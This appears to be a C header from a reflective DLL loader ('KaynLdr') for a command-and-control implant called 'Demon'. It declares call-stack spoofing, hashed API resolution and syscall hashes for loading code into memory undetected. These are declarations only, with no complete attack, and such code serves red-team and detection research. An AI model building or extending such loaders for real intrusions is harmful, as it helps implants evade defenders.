
#include <windows.h>
#include <Macro.h>

UINT_PTR GetRIP( VOID );
LPVOID   KaynCaller();
VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize );

/* KaynSpoofEntry - x64 only; installs fake callstack frames before JMPing to KaynDllMain */
#ifdef _WIN64
VOID KaynSpoofEntry( PVOID Target, PVOID Arg1, DWORD Arg2, PVOID Arg3,
                     PVOID FakeFrame1, PVOID FakeFrame2 );
#endif

#define PAGE_SIZE                       4096
#define MemCopy                         __builtin_memcpy
#define NTDLL_HASH                      0x70e61753

/* DJB2 hash constants for callstack spoofing (seed 5381, uppercase) - verified 2026-05-25 */
#define KERNEL32_HASH              0x6ddb9555  /* djb2_upper("KERNEL32.DLL")       */
#define BASETHREADINITTHUNK_HASH   0xe2491896  /* djb2_upper("BaseThreadInitThunk") */
#define RTLUSERTHREADSTART_HASH    0x0353797c  /* djb2_upper("RtlUserThreadStart")  */

#define SYS_LDRLOADDLL                  0x9e456a43
#define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
#define SYS_NTPROTECTEDVIRTUALMEMORY    0x50e92888

typedef struct {
    WORD offset :12;
    WORD type   :4;
} *PIMAGE_RELOC;

typedef struct
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} U_STRING, *PU_STRING;

typedef struct
{
    struct
    {
        UINT_PTR Ntdll;
    } Modules;

    struct {
        NTSTATUS ( NTAPI *LdrLoadDll )(
                PWSTR           DllPath,
                PULONG          DllCharacteristics,
                PU_STRING       DllName,
                PVOID           *DllHandle
        );

        NTSTATUS ( NTAPI *NtAllocateVirtualMemory ) (
                HANDLE      ProcessHandle,
                PVOID       *BaseAddress,
                ULONG_PTR   ZeroBits,
                PSIZE_T     RegionSize,
                ULONG       AllocationType,
                ULONG       Protect
        );

        NTSTATUS ( NTAPI *NtProtectVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   NewProtect,
                PULONG  OldProtect
        );
    } Win32;

} INSTANCE, *PINSTANCE;

#pragma pack(1)
typedef struct
{
    PVOID KaynLdr;
    PVOID DllCopy;
    PVOID Demon;
    DWORD DemonSize;
    PVOID TxtBase;
    DWORD TxtSize;
} KAYN_ARGS, *PKAYN_ARGS;
